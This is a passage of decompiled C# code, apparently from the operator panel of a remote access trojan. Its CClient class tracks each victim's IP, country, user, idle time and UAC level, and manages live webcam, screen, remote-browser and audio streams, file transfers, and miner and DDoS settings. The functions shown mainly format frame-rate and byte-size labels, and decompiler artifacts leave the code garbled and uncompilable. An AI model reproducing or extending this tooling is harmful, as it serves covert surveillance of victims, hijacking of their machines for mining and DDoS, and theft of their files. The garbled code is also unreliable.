						ProjectData.ClearProjectError();
					}
					string text4 = text2;
					Label label5 = label4;
					string[] array7 = array6;
					array5[num10] = text4;
					array7[6] = "/frame)";
					label5.Text = string.Concat(array7);
					this.lRemoteBrowserFPS = 0L;
					this.dRemoteBrowserFPSAvgSize = 0.0;
					@struct = default(Class136.Struct27);
					@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
					flag = false;
					if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
					{
						flag = true;
					}
					if (flag)
					{
						num = Class136.GetTickCount64();
					}
					else
					{
						num = (long)Class136.GetTickCount();
					}
					long num11 = num;
					this.lLastRemoteBrowserFrame = num11;
					return;
				}
			}
			else
			{
				Class136.Struct27 @struct = default(Class136.Struct27);
				@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
				bool flag = false;
				if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
				{
					flag = true;
				}
				long num;
				if (flag)
				{
					num = Class136.GetTickCount64();
				}
				else
				{
					num = (long)Class136.GetTickCount();
				}
				long num12 = num;
				this.lLastRemoteBrowserFrame = num12;
			}
		}

		// Token: 0x060019BE RID: 6590 RVA: 0x000B94B0 File Offset: 0x000B76B0
		internal void SCREEN_FPS_UPDATE(double dSize)
		{
			if (this.fDB.vmethod_26().InvokeRequired)
			{
				this.fDB.vmethod_26().Invoke(new CClient.Delegate204(this.SCREEN_FPS_UPDATE), new object[]
				{
					dSize
				});
				return;
			}
			ref long ptr = ref this.lFPS;
			this.lFPS = checked(ptr + 1L);
			ref double ptr2 = ref this.dFPSAvgSize;
			this.dFPSAvgSize = ptr2 + dSize;
			if (this.lLastScreenFrame > 0L)
			{
				Class136.Struct27 @struct = default(Class136.Struct27);
				@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
				bool flag = false;
				if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
				{
					flag = true;
				}
				long num;
				if (flag)
				{
					num = Class136.GetTickCount64();
				}
				else
				{
					num = (long)Class136.GetTickCount();
				}
				if (checked(num - this.lLastScreenFrame) >= 1000L)
				{
					Label label = this.fDB.vmethod_26();
					string[] array = new string[7];
					array[0] = "FPS: ";
					array[1] = Conversions.ToString(this.lFPS);
					array[2] = " (";
					int num2 = 3;
					double num3 = this.dFPSAvgSize;
					bool flag2 = false;
					ref bool ptr3 = ref flag2;
					double num4 = num3;
					int num5 = num2;
					string[] array2 = array;
					string[] array3 = array;
					Label label2 = label;
					int num6;
					string text2;
					int num7;
					object obj;
					try
					{
						ProjectData.ClearProjectError();
						num6 = 2;
						string text = string.Empty;
						if (num4 >= 1099511627776.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num4 >= 1073741824.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num4 >= 1048576.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num4 >= 1024.0)
						{
							text = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
						}
						else if (num4 < 1024.0)
						{
							text = Conversions.ToString(Conversion.Fix(num4)) + " B";
						}
						if (ptr3)
						{
							text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
						}
						if (text.Length > 0)
						{
							text2 = text;
						}
						else
						{
							text2 = " 0 B";
						}
						IL_298:
						goto IL_2E8;
						IL_29A:
						text2 = "0 B";
						goto IL_298;
						IL_2A3:
						num7 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
						IL_2B9:;
					}
					catch when (endfilter(obj is Exception & num6 != 0 & num7 == 0))
					{
						Exception ex = (Exception)obj2;
						goto IL_2A3;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_2E8:
					if (num7 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string text3 = text2;
					Label label3 = label2;
					string[] array4 = array3;
					array2[num5] = text3;
					array4[4] = "/s @ ";
					int num8 = 5;
					double num9 = this.dFPSAvgSize / (double)this.lFPS;
					flag2 = false;
					ptr3 = ref flag2;
					num4 = num9;
					int num10 = num8;
					string[] array5 = array4;
					string[] array6 = array4;
					Label label4 = label3;
					object obj3;
					try
					{
						ProjectData.ClearProjectError();
						num6 = 2;
						string text = string.Empty;
						if (num4 >= 1099511627776.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num4 >= 1073741824.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num4 >= 1048576.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num4 >= 1024.0)
						{
							text = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
						}
						else if (num4 < 1024.0)
						{
							text = Conversions.ToString(Conversion.Fix(num4)) + " B";
						}
						if (ptr3)
						{
							text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
						}
						if (text.Length > 0)
						{
							text2 = text;
						}
						else
						{
							text2 = " 0 B";
						}
						IL_4A4:
						goto IL_4F4;
						IL_4A6:
						text2 = "0 B";
						goto IL_4A4;
						IL_4AF:
						num7 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
						IL_4C5:;
					}
					catch when (endfilter(obj3 is Exception & num6 != 0 & num7 == 0))
					{
						Exception ex2 = (Exception)obj4;
						goto IL_4AF;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_4F4:
					if (num7 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string text4 = text2;
					Label label5 = label4;
					string[] array7 = array6;
					array5[num10] = text4;
					array7[6] = "/frame)";
					label5.Text = string.Concat(array7);
					this.lFPS = 0L;
					this.dFPSAvgSize = 0.0;
					@struct = default(Class136.Struct27);
					@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
					flag = false;
					if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
					{
						flag = true;
					}
					if (flag)
					{
						num = Class136.GetTickCount64();
					}
					else
					{
						num = (long)Class136.GetTickCount();
					}
					long num11 = num;
					this.lLastScreenFrame = num11;
					return;
				}
			}
			else
			{
				Class136.Struct27 @struct = default(Class136.Struct27);
				@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
				bool flag = false;
				if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
				{
					flag = true;
				}
				long num;
				if (flag)
				{
					num = Class136.GetTickCount64();
				}
				else
				{
					num = (long)Class136.GetTickCount();
				}
				long num12 = num;
				this.lLastScreenFrame = num12;
			}
		}

		// Token: 0x060019BF RID: 6591 RVA: 0x000B9AE0 File Offset: 0x000B7CE0
		internal void WEBCAM_FPS_UPDATE(ref double dSize)
		{
			if (this.fDB.vmethod_558().InvokeRequired)
			{
				this.fDB.vmethod_558().Invoke(new CClient.Delegate203(this.WEBCAM_FPS_UPDATE), new object[]
				{
					dSize
				});
				return;
			}
			ref long ptr = ref this.lFPSWebcam;
			this.lFPSWebcam = checked(ptr + 1L);
			ref double ptr2 = ref this.dFPSAvgSizeWebcam;
			this.dFPSAvgSizeWebcam = ptr2 + dSize;
			if (this.lLastWebcam > 0L)
			{
				Class136.Struct27 @struct = default(Class136.Struct27);
				@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
				bool flag = false;
				if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
				{
					flag = true;
				}
				long num;
				if (flag)
				{
					num = Class136.GetTickCount64();
				}
				else
				{
					num = (long)Class136.GetTickCount();
				}
				if (checked(num - this.lLastWebcam) >= 1000L)
				{
					Label label = this.fDB.vmethod_558();
					string[] array = new string[7];
					array[0] = "FPS: ";
					array[1] = Conversions.ToString(this.lFPSWebcam);
					array[2] = " (";
					int num2 = 3;
					double num3 = this.dFPSAvgSizeWebcam;
					bool flag2 = false;
					ref bool ptr3 = ref flag2;
					double num4 = num3;
					int num5 = num2;
					string[] array2 = array;
					string[] array3 = array;
					Label label2 = label;
					int num6;
					string text2;
					int num7;
					object obj;
					try
					{
						ProjectData.ClearProjectError();
						num6 = 2;
						string text = string.Empty;
						if (num4 >= 1099511627776.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num4 >= 1073741824.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num4 >= 1048576.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num4 >= 1024.0)
						{
							text = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
						}
						else if (num4 < 1024.0)
						{
							text = Conversions.ToString(Conversion.Fix(num4)) + " B";
						}
						if (ptr3)
						{
							text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
						}
						if (text.Length > 0)
						{
							text2 = text;
						}
						else
						{
							text2 = " 0 B";
						}
						IL_29A:
						goto IL_2EA;
						IL_29C:
						text2 = "0 B";
						goto IL_29A;
						IL_2A5:
						num7 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
						IL_2BB:;
					}
					catch when (endfilter(obj is Exception & num6 != 0 & num7 == 0))
					{
						Exception ex = (Exception)obj2;
						goto IL_2A5;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_2EA:
					if (num7 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string text3 = text2;
					Label label3 = label2;
					string[] array4 = array3;
					array2[num5] = text3;
					array4[4] = "/s @ ";
					int num8 = 5;
					double num9 = this.dFPSAvgSizeWebcam / (double)this.lFPSWebcam;
					flag2 = false;
					ptr3 = ref flag2;
					num4 = num9;
					int num10 = num8;
					string[] array5 = array4;
					string[] array6 = array4;
					Label label4 = label3;
					object obj3;
					try
					{
						ProjectData.ClearProjectError();
						num6 = 2;
						string text = string.Empty;
						if (num4 >= 1099511627776.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num4 >= 1073741824.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num4 >= 1048576.0)
						{
							text = Strings.Format(num4 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num4 >= 1024.0)
						{
							text = Strings.Format(num4 / 1024.0, "#0.00") + " KiB";
						}
						else if (num4 < 1024.0)
						{
							text = Conversions.ToString(Conversion.Fix(num4)) + " B";
						}
						if (ptr3)
						{
							text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
						}
						if (text.Length > 0)
						{
							text2 = text;
						}
						else
						{
							text2 = " 0 B";
						}
						IL_4A6:
						goto IL_4F6;
						IL_4A8:
						text2 = "0 B";
						goto IL_4A6;
						IL_4B1:
						num7 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num6);
						IL_4C7:;
					}
					catch when (endfilter(obj3 is Exception & num6 != 0 & num7 == 0))
					{
						Exception ex2 = (Exception)obj4;
						goto IL_4B1;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_4F6:
					if (num7 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string text4 = text2;
					Label label5 = label4;
					string[] array7 = array6;
					array5[num10] = text4;
					array7[6] = "/frame)";
					label5.Text = string.Concat(array7);
					this.lFPSWebcam = 0L;
					this.dFPSAvgSizeWebcam = 0.0;
					@struct = default(Class136.Struct27);
					@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
					flag = false;
					if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
					{
						flag = true;
					}
					if (flag)
					{
						num = Class136.GetTickCount64();
					}
					else
					{
						num = (long)Class136.GetTickCount();
					}
					long num11 = num;
					this.lLastWebcam = num11;
					return;
				}
			}
			else
			{
				Class136.Struct27 @struct = default(Class136.Struct27);
				@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
				bool flag = false;
				if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
				{
					flag = true;
				}
				long num;
				if (flag)
				{
					num = Class136.GetTickCount64();
				}
				else
				{
					num = (long)Class136.GetTickCount();
				}
				long num12 = num;
				this.lLastWebcam = num12;
			}
		}

		// Token: 0x060019C0 RID: 6592 RVA: 0x000BA114 File Offset: 0x000B8314
		public void AUDIO_PLAYBACK(byte[] bData)
		{
			int num;
			int num9;
			object obj3;
			try
			{
				ProjectData.ClearProjectError();
				num = 2;
				if (this.fDB.vmethod_316().InvokeRequired)
				{
					this.fDB.vmethod_316().Invoke(new CClient.Delegate202(this.AUDIO_PLAYBACK), new object[]
					{
						bData
					});
				}
				else
				{
					MemoryStream memoryStream = new MemoryStream(bData);
					int int_ = this.fDB.int_3;
					WaveFormat waveFormat;
					RawSourceWaveStream rawSourceWaveStream;
					List<ListViewItem> list;
					ListViewItem listViewItem2;
					ListViewItem listViewItem;
					bool flag;
					checked
					{
						int num2 = (int)Math.Round((double)1f);
						int num3 = num2 * int_;
						waveFormat = WaveFormat.CreateCustomFormat(1, int_, 1, num3, num2, 8);
						rawSourceWaveStream = new RawSourceWaveStream(memoryStream, waveFormat);
						list = new List<ListViewItem>();
						listViewItem = (listViewItem2 = new ListViewItem());
						Class136.Struct27 @struct = default(Class136.Struct27);
						@struct.int_0 = Marshal.SizeOf(typeof(Class136.Struct27));
						flag = false;
						if (Class136.GetVersionExA(ref @struct) && @struct.int_1 >= 6)
						{
							flag = true;
						}
					}
					long num4;
					if (flag)
					{
						num4 = Class136.GetTickCount64();
					}
					else
					{
						num4 = (long)Class136.GetTickCount();
					}
					long value = num4;
					ListViewItem listViewItem3 = listViewItem2;
					listViewItem.Text = Conversions.ToString(value);
					ListViewItem listViewItem4 = listViewItem3;
					ListViewItem.ListViewSubItemCollection subItems = listViewItem4.SubItems;
					double num5 = (double)bData.Length;
					bool flag2 = false;
					ref bool ptr = ref flag2;
					double num6 = num5;
					ListViewItem.ListViewSubItemCollection listViewSubItemCollection = subItems;
					int num7;
					string text2;
					int num8;
					object obj;
					try
					{
						ProjectData.ClearProjectError();
						num7 = 2;
						string text = string.Empty;
						if (num6 >= 1099511627776.0)
						{
							text = Strings.Format(num6 / 1024.0 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " TiB";
						}
						else if (num6 >= 1073741824.0)
						{
							text = Strings.Format(num6 / 1024.0 / 1024.0 / 1024.0, "#0.00") + " GiB";
						}
						else if (num6 >= 1048576.0)
						{
							text = Strings.Format(num6 / 1024.0 / 1024.0, "#0.00") + " MiB";
						}
						else if (num6 >= 1024.0)
						{
							text = Strings.Format(num6 / 1024.0, "#0.00") + " KiB";
						}
						else if (num6 < 1024.0)
						{
							text = Conversions.ToString(Conversion.Fix(num6)) + " B";
						}
						if (ptr)
						{
							text = Strings.Split(text, " ", -1, CompareMethod.Text)[0];
						}
						if (text.Length > 0)
						{
							text2 = text;
						}
						else
						{
							text2 = " 0 B";
						}
						IL_28B:
						goto IL_2DB;
						IL_28D:
						text2 = "0 B";
						goto IL_28B;
						IL_296:
						num8 = -1;
						@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num7);
						IL_2AC:;
					}
					catch when (endfilter(obj is Exception & num7 != 0 & num8 == 0))
					{
						Exception ex = (Exception)obj2;
						goto IL_296;
					}
					throw ProjectData.CreateProjectError(-2146828237);
					IL_2DB:
					if (num8 != 0)
					{
						ProjectData.ClearProjectError();
					}
					string text3 = text2;
					listViewSubItemCollection.Add(text3);
					listViewItem4.SubItems.Add(Conversions.ToString(rawSourceWaveStream.TotalTime.Seconds) + " s");
					listViewItem4.SubItems.Add(Conversions.ToString(rawSourceWaveStream.WaveFormat.SampleRate) + " Hz");
					listViewItem4.SubItems.Add(Conversions.ToString(rawSourceWaveStream.WaveFormat.Channels));
					listViewItem4.SubItems.Add(Conversions.ToString(rawSourceWaveStream.WaveFormat.BitsPerSample));
					listViewItem4.SubItems.Add(Conversions.ToString(rawSourceWaveStream.WaveFormat.BlockAlign));
					listViewItem4.SubItems.Add("PCM");
					list.Add(listViewItem4);
					this.fDB.vmethod_316().Items.AddRange(list.ToArray());
					this.fDB.concurrentStack_1.Push(rawSourceWaveStream);
					this.fDB.concurrentStack_2.Push(waveFormat);
					if (this.fDB.vmethod_330().Checked)
					{
						this.fDB.method_116(rawSourceWaveStream);
					}
				}
				IL_40C:
				goto IL_44F;
				IL_40E:
				num9 = -1;
				@switch(ICSharpCode.Decompiler.ILAst.ILLabel[], num);
				IL_422:;
			}
			catch when (endfilter(obj3 is Exception & num != 0 & num9 == 0))
			{
				Exception ex2 = (Exception)obj4;
				goto IL_40E;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			IL_44F:
			if (num9 != 0)
			{
				ProjectData.ClearProjectError();
			}
		}

		// Token: 0x060019C1 RID: 6593 RVA: 0x00002F44 File Offset: 0x00001144
		private void WPlaybackStopped(object sender, EventArgs e)
		{
		}

		// Token: 0x060019C2 RID: 6594 RVA: 0x0000CD12 File Offset: 0x0000AF12
		public override string ToString()
		{
			return this.sIP + ":" + this.sPort;
		}

		// Token: 0x0400097C RID: 2428
		public string sKey;

		// Token: 0x0400097D RID: 2429
		public bool IsClient;

		// Token: 0x0400097E RID: 2430
		public string sIP;

		// Token: 0x0400097F RID: 2431
		public string sPort;

		// Token: 0x04000980 RID: 2432
		public string sCountry;

		// Token: 0x04000981 RID: 2433
		public string sOperatingSystem;

		// Token: 0x04000982 RID: 2434
		public string sWindowTitle;

		// Token: 0x04000983 RID: 2435
		public string sUser;

		// Token: 0x04000984 RID: 2436
		public string sSystem;

		// Token: 0x04000985 RID: 2437
		public string sIdle;

		// Token: 0x04000986 RID: 2438
		public string sIdleMs;

		// Token: 0x04000987 RID: 2439
		public string sWebcam;

		// Token: 0x04000988 RID: 2440
		public string sInOut;

		// Token: 0x04000989 RID: 2441
		public string sSpeed;

		// Token: 0x0400098A RID: 2442
		public string sLANIP;

		// Token: 0x0400098B RID: 2443
		public long lSpeedBytesIn;

		// Token: 0x0400098C RID: 2444
		public long lSpeedBytesOut;

		// Token: 0x0400098D RID: 2445
		public string sBandwidthDL;

		// Token: 0x0400098E RID: 2446
		public string sCam;

		// Token: 0x0400098F RID: 2447
		public string sPing;

		// Token: 0x04000990 RID: 2448
		public long lPing;

		// Token: 0x04000991 RID: 2449
		public string sPID;

		// Token: 0x04000992 RID: 2450
		public string sCPUusage;

		// Token: 0x04000993 RID: 2451
		public string sRAM;

		// Token: 0x04000994 RID: 2452
		public string sUACLevel;

		// Token: 0x04000995 RID: 2453
		public long lCPUusage;

		// Token: 0x04000996 RID: 2454
		public string sSettingPassword;

		// Token: 0x04000997 RID: 2455
		public long lLastPacketTimeStamp;

		// Token: 0x04000998 RID: 2456
		public long lLastSignal;

		// Token: 0x04000999 RID: 2457
		public bool bPowerOffAllowed;

		// Token: 0x0400099A RID: 2458
		public fDashboard fDB;

		// Token: 0x0400099B RID: 2459
		public fPreview fPr;

		// Token: 0x0400099C RID: 2460
		public fMain ff;

		// Token: 0x0400099D RID: 2461
		public fSearch fSrch;

		// Token: 0x0400099E RID: 2462
		public StringBuilder sPacket;

		// Token: 0x0400099F RID: 2463
		public MemoryStream mPacket;

		// Token: 0x040009A0 RID: 2464
		public long lLastWebcam;

		// Token: 0x040009A1 RID: 2465
		public long lFPSWebcam;

		// Token: 0x040009A2 RID: 2466
		public double dFPSAvgSizeWebcam;

		// Token: 0x040009A3 RID: 2467
		public long lLastScreenFrame;

		// Token: 0x040009A4 RID: 2468
		public long lFPS;

		// Token: 0x040009A5 RID: 2469
		public double dFPSAvgSize;

		// Token: 0x040009A6 RID: 2470
		public long lLastRemoteBrowserFrame;

		// Token: 0x040009A7 RID: 2471
		public long lRemoteBrowserFPS;

		// Token: 0x040009A8 RID: 2472
		public double dRemoteBrowserFPSAvgSize;

		// Token: 0x040009A9 RID: 2473
		public long lLastPreviewScreenFrame;

		// Token: 0x040009AA RID: 2474
		public long lLastPreviewWebcamFrame;

		// Token: 0x040009AB RID: 2475
		public long lLastSpeedUpdate;

		// Token: 0x040009AC RID: 2476
		public long lPreviewScreenFPS;

		// Token: 0x040009AD RID: 2477
		public long lPreviewWebcamFPS;

		// Token: 0x040009AE RID: 2478
		public double dPreviewScreenFPSAvgSize;

		// Token: 0x040009AF RID: 2479
		public double dPreviewWebcamFPSAvgSize;

		// Token: 0x040009B0 RID: 2480
		public bool pending_dc;

		// Token: 0x040009B1 RID: 2481
		public bool pending_dc_timeout;

		// Token: 0x040009B2 RID: 2482
		public double stats_bytes_in;

		// Token: 0x040009B3 RID: 2483
		public double stats_last_bytes_in;

		// Token: 0x040009B4 RID: 2484
		public double stats_bytes_out;

		// Token: 0x040009B5 RID: 2485
		public double stats_last_bytes_out;

		// Token: 0x040009B6 RID: 2486
		public bool bJustConnected;

		// Token: 0x040009B7 RID: 2487
		public bool bIsAuthenticated;

		// Token: 0x040009B8 RID: 2488
		private Image img_flag;

		// Token: 0x040009B9 RID: 2489
		private Image img_con;

		// Token: 0x040009BA RID: 2490
		private Image img_tmb;

		// Token: 0x040009BB RID: 2491
		private Image img_type;

		// Token: 0x040009BC RID: 2492
		private Image img_status;

		// Token: 0x040009BD RID: 2493
		public GClass1 sock_async;

		// Token: 0x040009BE RID: 2494
		public NetworkStream mS;

		// Token: 0x040009BF RID: 2495
		internal readonly string mSocketCounter;

		// Token: 0x040009C0 RID: 2496
		private readonly string mIndex;

		// Token: 0x040009C1 RID: 2497
		public bool IS_SSL;

		// Token: 0x040009C2 RID: 2498
		public bool SCREEN_IS_STREAMING;

		// Token: 0x040009C3 RID: 2499
		public bool WEBCAM_IS_STREAMING;

		// Token: 0x040009C4 RID: 2500
		public bool REMOTE_BROWSER_IS_STREAMING;

		// Token: 0x040009C5 RID: 2501
		public bool FILE_TRANSFER_ISPAUSED;

		// Token: 0x040009C6 RID: 2502
		public bool FILE_TRANSFER_ACTIVE;

		// Token: 0x040009C7 RID: 2503
		public string FILE_TRANSFER_ID;

		// Token: 0x040009C8 RID: 2504
		public string FILE_TRANSFER_USER_KEY;

		// Token: 0x040009C9 RID: 2505
		public string FILE_TRANSFER_USER;

		// Token: 0x040009CA RID: 2506
		public string FILE_TRANSFER_FILENAME;

		// Token: 0x040009CB RID: 2507
		public string FILE_TRANSFER_FILESIZE;

		// Token: 0x040009CC RID: 2508
		public string FILE_TRANSFER_FILE_LAST_MODIFIED;

		// Token: 0x040009CD RID: 2509
		public string FILE_TRANSFER_GROUP_ID;

		// Token: 0x040009CE RID: 2510
		public string FILE_TRANSFER_REMOTE_FILE;

		// Token: 0x040009CF RID: 2511
		public string FILE_TRANSFER_LOCAL_FILE;

		// Token: 0x040009D0 RID: 2512
		public long FILE_TRANSFER_POS;

		// Token: 0x040009D1 RID: 2513
		public double FILE_TRANSFER_SPEED_COUNTER;

		// Token: 0x040009D2 RID: 2514
		public double FILE_TRANSFER_SPEED_AVG;

		// Token: 0x040009D3 RID: 2515
		public double FILE_TRANSFER_ELAPSED;

		// Token: 0x040009D4 RID: 2516
		public long FILE_TRANSFER_PACKETS;

		// Token: 0x040009D5 RID: 2517
		public double FILE_TRANSFER_STARTED;

		// Token: 0x040009D6 RID: 2518
		public double FILE_TRANSFER_PAUSED_TIMESTAMP;

		// Token: 0x040009D7 RID: 2519
		public long FILE_TRANSFER_LAST_PACKET;

		// Token: 0x040009D8 RID: 2520
		public MemoryStream FILE_TRANSFER_DL_DATA;

		// Token: 0x040009D9 RID: 2521
		public bool FILE_TRANSFER_COMPLETED;

		// Token: 0x040009DA RID: 2522
		public bool FILE_TRANSFER_IS_RESUME;

		// Token: 0x040009DB RID: 2523
		public long FILE_TRANSFER_COUNT_UL;

		// Token: 0x040009DC RID: 2524
		public long FILE_TRANSFER_COUNT_DL;

		// Token: 0x040009DD RID: 2525
		public string FLAG;

		// Token: 0x040009DE RID: 2526
		public string SCREENLIVE_SOCKET_ID;

		// Token: 0x040009DF RID: 2527
		public string SCREENLIVE_USER_KEY;

		// Token: 0x040009E0 RID: 2528
		public bool SCREENLIVE_ACTIVE;

		// Token: 0x040009E1 RID: 2529
		public int SCREENLIVE_FRAME_COUNT;

		// Token: 0x040009E2 RID: 2530
		public string SCREENLIVE_SECONDARY_SOCKET_ID;

		// Token: 0x040009E3 RID: 2531
		public string SCREENLIVE_SECONDARY_USER_KEY;

		// Token: 0x040009E4 RID: 2532
		public bool SCREENLIVE_SECONDARY_ACTIVE;

		// Token: 0x040009E5 RID: 2533
		public string SCREEN_PREVIEW_SOCKET_ID;

		// Token: 0x040009E6 RID: 2534
		public string SCREEN_PREVIEW_USER_KEY;

		// Token: 0x040009E7 RID: 2535
		public bool SCREEN_PREVIEW_ACTIVE;

		// Token: 0x040009E8 RID: 2536
		public string WEBCAMSTREAM_SOCKET_ID;

		// Token: 0x040009E9 RID: 2537
		public string WEBCAMSTREAM_USER_KEY;

		// Token: 0x040009EA RID: 2538
		public bool WEBCAMSTREAM_ACTIVE;

		// Token: 0x040009EB RID: 2539
		public string WEBCAM_PREVIEW_SOCKET_ID;

		// Token: 0x040009EC RID: 2540
		public string WEBCAM_PREVIEW_USER_KEY;

		// Token: 0x040009ED RID: 2541
		public bool WEBCAM_PREVIEW_ACTIVE;

		// Token: 0x040009EE RID: 2542
		public string REMOTE_BROWSER_SOCKET_ID;

		// Token: 0x040009EF RID: 2543
		public string REMOTE_BROWSER_USER_KEY;

		// Token: 0x040009F0 RID: 2544
		public bool REMOTE_BROWSER_ACTIVE;

		// Token: 0x040009F1 RID: 2545
		public string SOCKET_COMMAND_USER_KEY;

		// Token: 0x040009F2 RID: 2546
		public bool SOCKET_COMMAND_ACTIVE;

		// Token: 0x040009F3 RID: 2547
		public string SSL_CIPHER;

		// Token: 0x040009F4 RID: 2548
		public string SSL_HASH;

		// Token: 0x040009F5 RID: 2549
		public string SSL_KEYEXCHANGE;

		// Token: 0x040009F6 RID: 2550
		public string SSL_PROTOCOL;

		// Token: 0x040009F7 RID: 2551
		public string SSL_CIPHERSUITE;

		// Token: 0x040009F8 RID: 2552
		public bool PREVIEW_SCREEN_IS_ENABLED;

		// Token: 0x040009F9 RID: 2553
		public bool PREVIEW_WEBCAM_IS_ENABLED;

		// Token: 0x040009FA RID: 2554
		public string MINER_LAST_SETTINGS;

		// Token: 0x040009FB RID: 2555
		public string DDOS_LAST_SETTINGS;

		// Token: 0x040009FC RID: 2556
		private readonly long lSockTimeout;

		// Token: 0x020001D3 RID: 467
		internal sealed class Class151
		{
			// Token: 0x060019C4 RID: 6596 RVA: 0x0000CD2A File Offset: 0x0000AF2A
			internal void _Lambda$__15()
			{
				this.class152_0.cclient_0.AUDIO_PLAYBACK(this.byte_0);
			}

			// Token: 0x040009FE RID: 2558
			public byte[] byte_0;

			// Token: 0x040009FF RID: 2559
			public CClient.Class152 class152_0;
		}

		// Token: 0x020001D4 RID: 468
		internal sealed class Class152
		{
			// Token: 0x060019C6 RID: 6598 RVA: 0x0000CD42 File Offset: 0x0000AF42
			internal void _Lambda$__0()
			{
				this.cclient_0.fDB.method_22(ref this.string_0[0]);
			}

			// Token: 0x060019C7 RID: 6599 RVA: 0x0000CD60 File Offset: 0x0000AF60
			internal void _Lambda$__1()
			{
				this.cclient_0.fDB.method_3(ref this.string_0[0]);
			}

			// Token: 0x060019C8 RID: 6600 RVA: 0x0000CD7E File Offset: 0x0000AF7E
			internal void _Lambda$__2()
			{
				this.cclient_0.fDB.method_12(ref this.string_0[0]);
			}

			// Token: 0x060019C9 RID: 6601 RVA: 0x000BA5AC File Offset: 0x000B87AC
			internal void _Lambda$__3()
			{
				fDashboard fDB = this.cclient_0.fDB;
				long num = checked((long)Math.Round(Conversion.Val(this.string_0[0])));
				string text = "0";
				fDB.method_5(ref num, ref text);
			}

			// Token: 0x060019CA RID: 6602 RVA: 0x000BA5E8 File Offset: 0x000B87E8
			internal void _Lambda$__4()
			{
				fDashboard fDB = this.cclient_0.fDB;
				long num = checked((long)Math.Round(Conversion.Val(this.string_0[0])));
				fDB.method_5(ref num, ref this.string_0[1]);
			}

			// Token: 0x060019CB RID: 6603 RVA: 0x000BA5E8 File Offset: 0x000B87E8
			internal void _Lambda$__5()
			{
				fDashboard fDB = this.cclient_0.fDB;
				long num = checked((long)Math.Round(Conversion.Val(this.string_0[0])));
				fDB.method_5(ref num, ref this.string_0[1]);
			}

			// Token: 0x060019CC RID: 6604 RVA: 0x0000CD9C File Offset: 0x0000AF9C
			internal void _Lambda$__6()
			{
				this.cclient_0.fDB.method_16(ref this.string_0[0]);
			}

			// Token: 0x060019CD RID: 6605 RVA: 0x0000CDBA File Offset: 0x0000AFBA
			internal void _Lambda$__7()
			{
				this.cclient_0.fDB.method_13(ref this.string_0[1], Color.Red);
			}

			// Token: 0x060019CE RID: 6606 RVA: 0x0000CDDD File Offset: 0x0000AFDD
			internal void _Lambda$__8()
			{
				this.cclient_0.fDB.method_17(ref this.string_0[0]);
			}

			// Token: 0x060019CF RID: 6607 RVA: 0x000BA628 File Offset: 0x000B8828
			internal void _Lambda$__9()
			{
				fDashboard fDB = this.cclient_0.fDB;
				string @string = Encoding.UTF8.GetString(Convert.FromBase64String(this.string_0[1]));
				fDB.method_14(ref @string, "3");
			}

			// Token: 0x060019D0 RID: 6608 RVA: 0x000BA664 File Offset: 0x000B8864
			internal void _Lambda$__10()
			{
				fDashboard fDB = this.cclient_0.fDB;
				string @string = Encoding.UTF8.GetString(Convert.FromBase64String(this.string_0[1]));
				fDB.method_14(ref @string, this.string_0[2]);
			}

